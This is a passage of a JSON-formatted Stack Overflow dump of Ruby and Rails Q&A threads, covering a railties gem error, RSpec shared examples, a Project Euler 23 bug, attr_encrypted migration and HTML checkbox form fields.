(Gem::GemNotFoundException)\n1\n</code></pre>\n\n<pre><code>% bundle exec rails g --help; echo $?\n...\nUsage: rails generate GENERATOR [args] [options]\n...\n0\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 439, "user_id": 4363972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cAeCN.jpg?s=128&g=1", "display_name": "Ivan Derlich", "link": "https://stackoverflow.com/users/4363972/ivan-derlich"}, "edited": false, "score": 1, "creation_date": 1616453622, "post_id": 62769239, "comment_id": 118003039, "body": "This worked for me"}, {"owner": {"reputation": 100, "user_id": 5479897, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/315fee116cbad0660045e769979aa365?s=128&d=identicon&r=PG", "display_name": "developer01", "link": "https://stackoverflow.com/users/5479897/developer01"}, "edited": false, "score": 0, "creation_date": 1616559593, "post_id": 62769239, "comment_id": 118037654, "body": "This worked for me as well. Just the <code>rvm reset</code> command."}, {"owner": {"reputation": 849, "user_id": 2601689, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/KKSIm.jpg?s=128&g=1", "display_name": "Designer", "link": "https://stackoverflow.com/users/2601689/designer"}, "edited": false, "score": 0, "creation_date": 1618982839, "post_id": 62769239, "comment_id": 118763649, "body": "This worked for me! Thank you!"}], "tags": [], "owner": {"reputation": 71, "user_id": 6106869, "user_type": "registered", "profile_image": "https://graph.facebook.com/1133559040009593/picture?type=large", "display_name": "Maciej Majchrowski", "link": "https://stackoverflow.com/users/6106869/maciej-majchrowski"}, "is_accepted": false, "score": 7, "last_activity_date": 1594102968, "creation_date": 1594102968, "answer_id": 62769239, "question_id": 52051122, "link": "https://stackoverflow.com/questions/52051122/cant-find-gem-railties-0-a-with-executable-rails-gemgemnotfoundexceptio/62769239#62769239", "title": "Can&#39;t find gem railties (&gt;= 0.a) with executable rails (Gem::GemNotFoundException)", "body": "<p>I'd to run <code>rvm reset</code> and it started working. The solution I found was connected with rvm warning &quot;Warning! PATH is not properly set up, /Users/xxx/.rvm/gems/ruby-2.5.3/bin is not at first place.&quot;. (OSX Catalina)</p>\n"}], "owner": {"reputation": 185, "user_id": 9030906, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-HZvE1tAtOSY/AAAAAAAAAAI/AAAAAAAABTY/kcbGEdtr2og/photo.jpg?sz=128", "display_name": "Vivank Sharma", "link": "https://stackoverflow.com/users/9030906/vivank-sharma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 20022, "favorite_count": 0, "accepted_answer_id": 52051721, "answer_count": 6, "score": 9, "last_activity_date": 1594102968, "creation_date": 1535436345, "last_edit_date": 1535436529, "question_id": 52051122, "link": "https://stackoverflow.com/questions/52051122/cant-find-gem-railties-0-a-with-executable-rails-gemgemnotfoundexceptio", "title": "Can&#39;t find gem railties (&gt;= 0.a) with executable rails (Gem::GemNotFoundException)", "body": "<p>I am trying to build a new application or check the version of rails. I get the following error:</p>\n\n<pre><code>Traceback (most recent call last):\n    2: from /usr/local/bin/rails:22:in `&lt;main&gt;'\n    1: from /Users/vivanksharma/.rbenv/versions/2.5.1/lib/ruby/2.5.0/rubygems.rb:263:in `bin_path'\n/Users/vivanksharma/.rbenv/versions/2.5.1/lib/ruby/2.5.0/rubygems.rb:289:in `find_spec_for_exe': can't find gem railties (&gt;= 0.a) with executable rails (Gem::GemNotFoundException)\n</code></pre>\n\n<p>I searched many different solutions, but none of them worked for me.</p>\n\n<p>Any help would be great.</p>\n\n<blockquote>\n  <p>ruby -v ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-darwin17]</p>\n  \n  <p>rbenv -v rbenv 1.1.1</p>\n</blockquote>\n\n<p>Even executing <code>bundle install</code> gives an error <code>Could not locate Gemfile</code>.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "model-view-controller", "rspec"], "answers": [{"tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": true, "score": 1, "last_activity_date": 1535435363, "creation_date": 1535435363, "answer_id": 52050944, "question_id": 52050915, "link": "https://stackoverflow.com/questions/52050915/rspec-how-can-i-make-one-shared-example-test-that-tests-many-different-controll/52050944#52050944", "title": "RSpec: How can I make one shared_example test that tests many different controller PATCH requests that all update different attributes?", "body": "<p><code>shared_example</code>\u2019s block accepts arguments:</p>\n\n<pre><code>shared_example \"update\" do |custom_field|\n  it \"updates the object (field: #{custom_field})\" do\n    expect do \n      patch :update, id.object.id, data: { custom_field =&gt; \"new value\" }\n    end.to change { object.reload.public_send(custom_field) }\n  end\nend\n</code></pre>\n\n<p>and call it as</p>\n\n<pre><code>include_examples 'update', :make\ninclude_examples 'update', :breed\n</code></pre>\n"}], "owner": {"reputation": 135, "user_id": 2909286, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/cfed8b5287af4f1922b3b3ed4c9452aa?s=128&d=identicon&r=PG&f=1", "display_name": "SolidSnake", "link": "https://stackoverflow.com/users/2909286/solidsnake"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 29, "favorite_count": 0, "accepted_answer_id": 52050944, "answer_count": 1, "score": 0, "last_activity_date": 1535435363, "creation_date": 1535435184, "question_id": 52050915, "link": "https://stackoverflow.com/questions/52050915/rspec-how-can-i-make-one-shared-example-test-that-tests-many-different-controll", "title": "RSpec: How can I make one shared_example test that tests many different controller PATCH requests that all update different attributes?", "body": "<p>I have various controllers and I have tests for each one that test their update action. The tests have all the exact same structure: it tests if it a patch request will update and change the object, or not. The only difference between these tests are which attribute the tests check to see for its change assertion. These attributes are unique to the controllers.</p>\n\n<pre><code>class CarsController \n\ndef update\n   # update attribute\n   ...\nend\n\nend\n</code></pre>\n\n<p>and</p>\n\n<pre><code>class DogsController \n\ndef update\n   # update attribute\n   ...\nend\n\nend\n</code></pre>\n\n<p>My tests (2 of many more):</p>\n\n<pre><code>CarsSpec \ndescribe \"PATCH\" do\n  it \"should update the car\" do\n    expect do \n      patch :update, id: object.id, data: {make: \"honda\"}\n    end.to change {object.reload.make}\n  end\nend\n\nDogSpec \ndescribe \"PATCH\" do\n  it \"should update the dog\" do\n    expect do \n      patch :update, id: object.id, data: {breed: \"husky\"}\n    end.to change {object.reload.breed}\n  end\nend\n</code></pre>\n\n<p>As you can see, they're the exact same structure of tests so naturally, to be DRY I want to extract them into a shared_example to be DRY. The idea is to have many more of these controllers but only actual test and that these controllers just pass in which field to update. It would involve something like</p>\n\n<pre><code>shared_example \"update\" do\n  it \"updates the object\" do\n    expect do \n      patch :update, id.object.id, data: { customField: \"new value\" }\n    end.to change { object.reload.customField }\n  end\nend\n</code></pre>\n\n<p>Where customField could be either breed or make in this case and the test would know to update those fields so it is generic and can apply to many of these controllers. How can I achieve that or something similar?</p>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 90, "user_id": 9612664, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-7FScr6ryYII/AAAAAAAAAAI/AAAAAAAAADA/EH1ZAcd8YbY/photo.jpg?sz=128", "display_name": "aimen alt", "link": "https://stackoverflow.com/users/9612664/aimen-alt"}, "reply_to_user": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 1, "creation_date": 1535425430, "post_id": 52049268, "comment_id": 91049551, "body": "@sawa, as I mentioned, I am expecting the program print 4179871, which is the correct answer, yet it is printing 4177763. I need need help To point out a logical error that I could not see that others might be able to see."}, {"owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "edited": false, "score": 0, "creation_date": 1535445286, "post_id": 52049268, "comment_id": 91057130, "body": "As @aimenalt or just add <code>uniq</code> (<code>factorsNums.uniq</code>) as returning value of <code>factors(num)</code>"}], "answers": [{"comments": [{"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 1, "creation_date": 1535440606, "post_id": 52049637, "comment_id": 91054421, "body": "If you cant&#39; fix a problem in 2 hours, you probably can in 3 ;-) Well done!"}, {"owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "edited": false, "score": 0, "creation_date": 1535445193, "post_id": 52049637, "comment_id": 91057073, "body": "<code>factors_original(6) # =&gt; [1, 2, 3, 3]</code> vs. <code>factors_fixed(6) # =&gt; [1, 2, 3]</code>"}, {"owner": {"reputation": 90, "user_id": 9612664, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-7FScr6ryYII/AAAAAAAAAAI/AAAAAAAAADA/EH1ZAcd8YbY/photo.jpg?sz=128", "display_name": "aimen alt", "link": "https://stackoverflow.com/users/9612664/aimen-alt"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535502422, "post_id": 52049637, "comment_id": 91085853, "body": "@Stefan thanks mate! If you ever knew the frustration I felt, I was even testing out the function by itself with numbers that have repeated factors and it worked the way I thought it should but for a logical reason, some other other numbers with repeated factors, and sadly though I could&#39;ve used a .uniq but I only looked up how to remove repeats in the middle of the program itself."}, {"owner": {"reputation": 90, "user_id": 9612664, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-7FScr6ryYII/AAAAAAAAAAI/AAAAAAAAADA/EH1ZAcd8YbY/photo.jpg?sz=128", "display_name": "aimen alt", "link": "https://stackoverflow.com/users/9612664/aimen-alt"}, "edited": false, "score": 0, "creation_date": 1535502792, "post_id": 52049637, "comment_id": 91085919, "body": "But that&#39;s why I never thought the issue came from the factors function. At least until I pasted someone&#39;s program for the same problem to solve and had them both output different data until I found what I needed."}, {"owner": {"reputation": 90, "user_id": 9612664, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-7FScr6ryYII/AAAAAAAAAAI/AAAAAAAAADA/EH1ZAcd8YbY/photo.jpg?sz=128", "display_name": "aimen alt", "link": "https://stackoverflow.com/users/9612664/aimen-alt"}, "edited": false, "score": 0, "creation_date": 1535502926, "post_id": 52049637, "comment_id": 91085944, "body": "Or an even better fix was to  just slap a .uniq after factorNums at the end and problem solved"}], "tags": [], "owner": {"reputation": 90, "user_id": 9612664, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-7FScr6ryYII/AAAAAAAAAAI/AAAAAAAAADA/EH1ZAcd8YbY/photo.jpg?sz=128", "display_name": "aimen alt", "link": "https://stackoverflow.com/users/9612664/aimen-alt"}, "is_accepted": false, "score": 2, "last_activity_date": 1535427139, "last_edit_date": 1535427139, "creation_date": 1535426661, "answer_id": 52049637, "question_id": 52049268, "link": "https://stackoverflow.com/questions/52049268/unable-to-find-the-correct-number-for-project-euler-23/52049637#52049637", "title": "Unable to find the correct number for Project Euler 23", "body": "<p>The issue was How the factors were handled, there were duplicates in the array containing factors and this is the fix: </p>\n\n<pre><code>def factors(num) # function that returns array of factors  \n  factorsNums = []   \n  for i in 1..Math.sqrt(num).ceil\n    if num % i == 0\n      factorsNums.push(i) if i != num &amp;&amp; !factorsNums.include? i\n      factorsNums.push(num / i) if ((num / i) &lt; num) &amp;&amp; ((factorsNums.include? (num / i)) == false)\n    end   \n  end   \n  factorsNums \nend\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 93653, "user_id": 256970, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/87b71ecb90417c88f7873a2f0f9492e9?s=128&d=identicon&r=PG", "display_name": "Cary Swoveland", "link": "https://stackoverflow.com/users/256970/cary-swoveland"}, "is_accepted": false, "score": 1, "last_activity_date": 1535775957, "last_edit_date": 1535775957, "creation_date": 1535476230, "answer_id": 52063157, "question_id": 52049268, "link": "https://stackoverflow.com/questions/52049268/unable-to-find-the-correct-number-for-project-euler-23/52063157#52063157", "title": "Unable to find the correct number for Project Euler 23", "body": "<p>In constructing a method that returns an array of proper factors of a given positive interger, we can make use of the method <a href=\"https://ruby-doc.org/stdlib-2.5.1/libdoc/prime/rdoc/Prime.html#method-i-prime_division\" rel=\"nofollow noreferrer\">Prime::prime_division</a>, that determines the prime decomposition of every positive integer. For example,</p>\n\n<pre><code>require 'prime'\n\nPrime.prime_division(180)\n  #=&gt; [[2, 2], [3, 2], [5, 1]]\n</code></pre>\n\n<p>This means that</p>\n\n<pre><code>180 = 2**2 * 3**2 * 5**1\n</code></pre>\n\n<p>Moreover, every factor of <code>180</code> equals</p>\n\n<pre><code>2**n2 * 3**n3 * 5**n5\n</code></pre>\n\n<p>where <code>0 &lt;&lt; n2 &lt;&lt; 2</code>, <code>0 &lt;&lt; n3 &lt;&lt; 2</code> and <code>0 &lt;= n5 &lt;= 1</code>. The <em>proper</em> factors are all factors other than <code>180</code>, which number</p>\n\n<pre><code>(2+1)*(2+1)*(1+1) - 1 #=&gt; 17\n</code></pre>\n\n<p>We therefore can define the OP's method <code>factors</code> (which I've renamed <code>proper_factors</code>) as follows. </p>\n\n<pre><code>def proper_factors(n)\n  first, *rest = Prime.prime_division(n).\n                       map { |m,pow| (0..pow).map { |p| m**p } }\n  first.product(*rest).\n        map { |arr| arr.reduce(:*) } - [n]\nend\n\nproper_factors(180)\n  #=&gt; [1, 5, 3, 15, 9, 45, 2, 10, 6, 30, 18, 90, 4, 20, 12, 60, 36]\n</code></pre>\n\n<p>Next, create an array of abundant numbers between 12 and 28123.</p>\n\n<pre><code>max_val = 28123    \nabundants = (12..max_val).select { |n| proper_factors(n).sum &gt; n }\n  #=&gt; [12, 18, 20, 24, 30, 36, 40, 42, 48, 54, 56, 60, 66, 70, 72, 78, 80,\n  #    ...\n  #    12078, 12080, 12084, 12090, 12096, 12100, 12102, 12104, 12108, 12110,\n  #    ...\n  #    28086, 28092, 28098, 28100, 28104, 28110, 28112, 28116, 28120, 28122]\nabundants.size\n  #=&gt; 6965\n</code></pre>\n\n<p>The sum of positive numbers that do not equal the sum of two abundant numbers equals the sum of numbers between 1 and 28123 (the sum of an arithmetic series) minus the sum of numbers between 1 and 28123 that equal the sum of two abundant numbers. Numbers that  equal the sum of two abundant numbers are easier to calculate than numbers that do not have that property, so we will calculate the desired sum as the difference between two sums.</p>\n\n<p>The sum of numbers between 1 and 28123 equals</p>\n\n<pre><code>all_sum = 28123*(1+28123)/2\n  #=&gt; 395465626\n</code></pre>\n\n<p>We now calculate the sum of numbers between 1 and 28123 that equal the sum of two abundant numbers. To do that we merely accumulate (in an array) the sums of all pairs of abundant numbers that do not exceed <code>28123</code>. This will produce many duplicates, of course, so we must <code>uniq</code>ify the array before summing its values. (We could instead accumulate in a set.)</p>\n\n<pre><code>half_max = max_val/2\n  #=&gt; 14061\nlast_abundants_idx = abundants.size - 1\n  #=&gt; 6964\n\nsum_nbrs_sum_two = abundants.each_with_index.with_object([]) do |(n,i),found|\n  break found if n &gt; half_max\n  (i..last_abundants_idx).each do |j|\n    m = n + abundants[j]\n    break if m &gt; max_val\n    found &lt;&lt; m\n  end\nend.uniq.sum\n  #=&gt; 391285755\n</code></pre>\n\n<p>Here the arrays <code>found</code> and <code>found.uniq</code> respectively contained <code>12148815</code> and  <code>26667</code> elements.<sup>1</sup></p>\n\n<p>The last step is the following.</p>\n\n<pre><code>all_sum - sum_nbrs_sum_two\n  #=&gt; 4179871\n</code></pre>\n\n<p><sup>1 Notice that the third line contains the range <code>(i..last_abundants_idx)</code>, not  <code>(i+1..last_abundants_idx)</code>, to include the number <code>2*abundants[i]</code>. This is true for all <code>i</code>, but for most <code>i</code>, <code>2*abundants[i]</code> equals the sum of two different abundant numbers. In fact, if <code>i..</code> were changed to <code>i+1..</code> the sum (<code>391285755</code>) is only decreased by <code>64</code>.</sup></p>\n"}], "owner": {"reputation": 90, "user_id": 9612664, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-7FScr6ryYII/AAAAAAAAAAI/AAAAAAAAADA/EH1ZAcd8YbY/photo.jpg?sz=128", "display_name": "aimen alt", "link": "https://stackoverflow.com/users/9612664/aimen-alt"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1535775957, "creation_date": 1535423560, "question_id": 52049268, "link": "https://stackoverflow.com/questions/52049268/unable-to-find-the-correct-number-for-project-euler-23", "title": "Unable to find the correct number for Project Euler 23", "body": "<p>I have been trying to find the the problem for over 2 hours, the correct answer is 4179871 but I have only been getting 4177763, </p>\n\n<blockquote>\n  <p>A perfect number is a number for which the sum of its proper divisors\n  is exactly equal to the number. For example, the sum of the proper\n  divisors of 28 would be 1 + 2 + 4 + 7 + 14 = 28, which means that 28\n  is a perfect number.</p>\n  \n  <p>A number n is called deficient if the sum of its proper divisors is\n  less than n and it is called abundant if this sum exceeds n.</p>\n  \n  <p>As 12 is the smallest abundant number, 1 + 2 + 3 + 4 + 6 = 16, the\n  smallest number that can be written as the sum of two abundant numbers\n  is 24. By mathematical analysis, it can be shown that all integers\n  greater than 28123 can be written as the sum of two abundant numbers.\n  However, this upper limit cannot be reduced any further by analysis\n  even though it is known that the greatest number that cannot be\n  expressed as the sum of two abundant numbers is less than this limit.</p>\n  \n  <p>Find the sum of all the positive integers which cannot be written as\n  the sum of two abundant numbers.</p>\n</blockquote>\n\n<pre><code>def factors(num) # function that returns array of factors\n  factorsNums = []\n  for i in 1..Math.sqrt(num).ceil\n    if num % i == 0\n      factorsNums.push(i) if i != num\n      factorsNums.push(num / i) if ((num / i) &lt; num) &amp;&amp; ((factorsNums.include? (num / i)) == false)\n    end\n  end\n  factorsNums\nend\nabundantNumbers = []\n\nfor i in 1..28123 #This loop will push into the array \"abundantNumbers\" each number from 1 to 28123 that is an abundant number (a number in which the sum of its divisors is bigger than the number itself)\n  abundantNumbers.push(i) if factors(i).inject(0, :+) &gt; i\nend\n\nabundantSums = []\n#this 2 dimensional loop will find the every possible sum of 2 abundant numbers from which we got in the last for loop and push them into another array \"abundantSums\"\n  for i in 0...abundantNumbers.length\n    for j in i...abundantNumbers.length\n      sum = abundantNumbers[i] + abundantNumbers[j]\n      abundantSums.push(sum) if sum &lt;= 28123\n    end\n  end\n\n\nabundantSums = abundantSums.uniq.sort #remove duplicates and sort the array\n\nnotSums = []\n\nfor i in 1..28123 #find numbers which are not the sum of 2 abundant numbers and push them into the array \"notSums\"\n  notSums.push(i) if (abundantSums.include? i) == false \nend\nprint notSums.inject(0, :+) #print out sum of array elements that are not sums of abundant numbers\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "postgresql", "ruby-on-rails-5", "attr-encrypted"], "answers": [{"comments": [{"owner": {"reputation": 386, "user_id": 1257780, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a8deb55d83d3cd517b5117a5a0077c18?s=128&d=identicon&r=PG", "display_name": "Adam Sweeney", "link": "https://stackoverflow.com/users/1257780/adam-sweeney"}, "edited": false, "score": 0, "creation_date": 1535463031, "post_id": 52049292, "comment_id": 91068524, "body": "Thanks, I think my issue was having messed up records in my database. This kind&#39;ve helped out some of those."}], "tags": [], "owner": {"reputation": 4690, "user_id": 1937435, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/YyN37.jpg?s=128&g=1", "display_name": "Josh Brody", "link": "https://stackoverflow.com/users/1937435/josh-brody"}, "is_accepted": true, "score": 0, "last_activity_date": 1535423730, "creation_date": 1535423730, "answer_id": 52049292, "question_id": 52049212, "link": "https://stackoverflow.com/questions/52049212/updating-existing-unencrypted-records-with-attr-encrypted/52049292#52049292", "title": "Updating existing unencrypted records with attr_encrypted", "body": "<p>You should be able to just update them all with a save. Something like:</p>\n\n<p><code>rails g migration update_apartment_notes_note_for_encryption</code></p>\n\n<p>Open that generated file.</p>\n\n<pre><code>def change\n  AppointmentNote.find_each do |apartment_note|\n    apartment_note.save \n  end\nend\n</code></pre>\n\n<p><code>rake db:migrate</code></p>\n\n<p>Note: Using find_each is wiser than <code>all</code> if you have tons of records. The goal here is to iterate over them.</p>\n"}], "owner": {"reputation": 386, "user_id": 1257780, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/a8deb55d83d3cd517b5117a5a0077c18?s=128&d=identicon&r=PG", "display_name": "Adam Sweeney", "link": "https://stackoverflow.com/users/1257780/adam-sweeney"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 302, "favorite_count": 0, "accepted_answer_id": 52049292, "answer_count": 1, "score": 0, "last_activity_date": 1535430362, "creation_date": 1535423014, "last_edit_date": 1535430362, "question_id": 52049212, "link": "https://stackoverflow.com/questions/52049212/updating-existing-unencrypted-records-with-attr-encrypted", "title": "Updating existing unencrypted records with attr_encrypted", "body": "<p>How do I update existing records that were previously unencrypted with the gem attr_encrypted.</p>\n\n<p>I currently have the column <code>text</code> in a table called <code>AppointmentNote</code> which is just a string. I now want to have a column called <code>note</code> which is encrypted (with attr_encrypted).</p>\n\n<p>I've added the columns</p>\n\n<p><code>encrypted_note</code>\n<code>encrypted_note_iv</code> </p>\n\n<p>This works well when I do <code>AppointmentNote.create(note: \"blah\")</code> it encrypts properly, and any further updates on that record work well.</p>\n\n<p>The problem is with records created prior to the migration. How do i migrate all the data from the column <code>text</code> into the new encrypted columns <code>encrypted_note</code> and <code>encrypted_note_iv</code></p>\n\n<p>This is the model</p>\n\n<pre><code>class AppointmentNote &lt; ApplicationRecord\n  attr_encrypted_options.merge!(encode: true)\n  attr_encrypted :note, key: SOME_KEY\n  ...\nend\n</code></pre>\n\n<p>If i do the what I thought the obvious solution was it simply roll back\n<code>AppointmentNote.first.update(note: \"rawr\")</code></p>\n\n<p>Thanks</p>\n"}, {"tags": ["html", "ruby", "model-view-controller", "sinatra", "sinatra-activerecord"], "comments": [{"owner": {"reputation": 2494, "user_id": 8659598, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bZpWy.png?s=128&g=1", "display_name": "MichaelvE", "link": "https://stackoverflow.com/users/8659598/michaelve"}, "edited": false, "score": 3, "creation_date": 1535417361, "post_id": 52048624, "comment_id": 91048087, "body": "Your input tags each have 2 name properties. They should only have one."}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535433726, "post_id": 52048624, "comment_id": 91051412, "body": "And 2 <code>value</code> properties each."}, {"owner": {"reputation": 13, "user_id": 10282224, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/446dce4ecf1ceb4de7d4f3579dfeda80?s=128&d=identicon&r=PG&f=1", "display_name": "Caliz", "link": "https://stackoverflow.com/users/10282224/caliz"}, "edited": false, "score": 0, "creation_date": 1535434510, "post_id": 52048624, "comment_id": 91051700, "body": "But how would I differentiate between the two values when using a state_name in one of my views and the abbreviation in anothor view?"}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535435930, "post_id": 52048624, "comment_id": 91052207, "body": "Please include <b>only</b> the action you are submitting this form on."}, {"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535436016, "post_id": 52048624, "comment_id": 91052244, "body": "Another question, are you really hardcoding the state names and abbreviations in your form? You already have a table <i>states</i>. You should have all the state names and abs stored there and render the form by iterating on the list fetch from this table."}, {"owner": {"reputation": 13, "user_id": 10282224, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/446dce4ecf1ceb4de7d4f3579dfeda80?s=128&d=identicon&r=PG&f=1", "display_name": "Caliz", "link": "https://stackoverflow.com/users/10282224/caliz"}, "edited": false, "score": 0, "creation_date": 1535436197, "post_id": 52048624, "comment_id": 91052304, "body": "I&#39;m not sure what you mean by only the action? I&#39;m sorry, I am a new student and am very confused by all of this! That makes more sense, but I don&#39;t understand how the table <i>states</i> would have each state name/abbreviation if I haven&#39;t entered it anywhere?"}], "answers": [{"comments": [{"owner": {"reputation": 4644, "user_id": 2594185, "user_type": "registered", "profile_image": "https://graph.facebook.com/100003773788931/picture?type=large", "display_name": "Jagdeep Singh", "link": "https://stackoverflow.com/users/2594185/jagdeep-singh"}, "edited": false, "score": 0, "creation_date": 1535431006, "post_id": 52048693, "comment_id": 91050664, "body": "Will still pass only one value to the server."}], "tags": [], "owner": {"reputation": 2494, "user_id": 8659598, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/bZpWy.png?s=128&g=1", "display_name": "MichaelvE", "link": "https://stackoverflow.com/users/8659598/michaelve"}, "is_accepted": false, "score": -1, "last_activity_date": 1535417831, "creation_date": 1535417831, "answer_id": 52048693, "question_id": 52048624, "link": "https://stackoverflow.com/questions/52048624/how-do-i-submit-more-than-one-checkbox-in-an-html-form/52048693#52048693", "title": "How do I submit more than one checkbox in an HTML form?", "body": "<p>Use only one name and value per input, like:</p>\n\n<pre><code>&lt;input type=\"checkbox\" name=\"state_name\" value=\"CT\"&gt; Connecticut&lt;br&gt;&lt;input type=\"checkbox\" name=\"state_name\" value=\"DE\"&gt; Deleware &lt;br&gt;&lt;input type=\"checkbox\" name=\"state_name\" value=\"ME\"&gt; Maine&lt;br&gt;&lt;input type=\"checkbox\" name=\"state_name\" value=\"MD\"&gt; Maryland\n</code></pre>\n\n<p>Check your POST array for state_name and their should be an array of all check-boxes selected.</p>\n"}, {"comments": [{"owner": {"reputation": 13, "user_id": 10282224, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/446dce4ecf1ceb4de7d4f3579dfeda80?s=128&d=identicon&r=PG&f=1", "display_name": "Caliz", "link": "https://stackoverflow.com/users/10282224/caliz"}, "edited": false, "score": 0, "creation_date": 1535433390, "post_id": 52048716, "comment_id": 91051286, "body": "Thanks, but I need to gather both params of &quot;abbreviation&quot; AND &quot;state_name&quot;. If I just do name=&quot;abbreviation&quot; then I lose out the state_name value. The idea is that the users can check off certain states and it will return the state names they checked off. I need the abbreviations to iterate through state pictures that are named by abbreviation."}, {"owner": {"reputation": 44, "user_id": 1913732, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/93ee866f65628b36c3390f04f82c30f4?s=128&d=identicon&r=PG", "display_name": "Raziel Ravenheart", "link": "https://stackoverflow.com/users/1913732/raziel-ravenheart"}, "reply_to_user": {"reputation": 13, "user_id": 10282224, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/446dce4ecf1ceb4de7d4f3579dfeda80?s=128&d=identicon&r=PG&f=1", "display_name": "Caliz", "link": "https://stackoverflow.com/users/10282224/caliz"}, "edited": false, "score": 0, "creation_date": 1535467035, "post_id": 52048716, "comment_id": 91071128, "body": "Then you are looking this problem the wrong way.  You need to learn a bit more about html.  As we told you, only the last attribute you use is going to be send, non-negotiable, that is how html works.  I recommend you to read a bit more about html and how ids, classes, data-*, name, value and types work."}, {"owner": {"reputation": 44, "user_id": 1913732, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/93ee866f65628b36c3390f04f82c30f4?s=128&d=identicon&r=PG", "display_name": "Raziel Ravenheart", "link": "https://stackoverflow.com/users/1913732/raziel-ravenheart"}, "reply_to_user": {"reputation": 13, "user_id": 10282224, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/446dce4ecf1ceb4de7d4f3579dfeda80?s=128&d=identicon&r=PG&f=1", "display_name": "Caliz", "link": "https://stackoverflow.com/users/10282224/caliz"}, "edited": false, "score": 0, "creation_date": 1535467433, "post_id": 52048716, "comment_id": 91071413, "body": "As I see it, you have some options: 1. Use javascript to achieve what you need, but you will have to learn about events, dom and ajax (using the new api fetch). 2. Remember that what I wrote is just an example you need to tailor it to your needs, you can do something like this: <code>&lt;input type=&quot;checkbox&quot; name=&quot;state_name[DE]&quot; value=&quot;Delaware&quot;&gt;Delaware&lt;br &#47;&gt;</code> and then process it with your server language.  You would lose the abbrevation part, but you know what those are. There maybe are another options, but it depends on how you want to resolve the current problem."}], "tags": [], "owner": {"reputation": 44, "user_id": 1913732, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/93ee866f65628b36c3390f04f82c30f4?s=128&d=identicon&r=PG", "display_name": "Raziel Ravenheart", "link": "https://stackoverflow.com/users/1913732/raziel-ravenheart"}, "is_accepted": false, "score": 0, "last_activity_date": 1535418641, "last_edit_date": 1535418641, "creation_date": 1535418105, "answer_id": 52048716, "question_id": 